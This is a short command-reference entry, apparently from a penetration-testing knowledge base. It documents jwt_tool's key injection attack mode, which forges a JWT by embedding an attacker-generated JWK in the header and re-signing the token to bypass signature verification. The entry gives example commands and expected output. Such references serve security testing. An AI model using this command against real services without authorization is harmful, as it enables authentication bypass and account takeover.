---
type: command
executor: bash
data: python3 jwt_tool.py $_TARGET_JWT -X i
tags:
  - jwt
  - injection
  - bypass
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# jwt-tool-key-injection

## Command

```bash
python3 jwt_tool.py $_TARGET_JWT -X i
```

## Description

Performs an automated key injection attack on a JWT by generating an RSA key pair, injecting the public key as JWK into the header, and re-signing with the private key to bypass verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_JWT | The original JWT to tamper with | Yes |
| -X i | Key injection attack mode | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... -X i
```

### Advanced Usage

With verbose output:

```bash
python3 jwt_tool.py $_TARGET_JWT -X i -v
```

## Expected Output

Tampered JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6... (with injected JWK and new signature)

## Related

- [[procedures/JWT-Signature-Key-Injection-Attack]]
- [[tools/jwt-tool]]
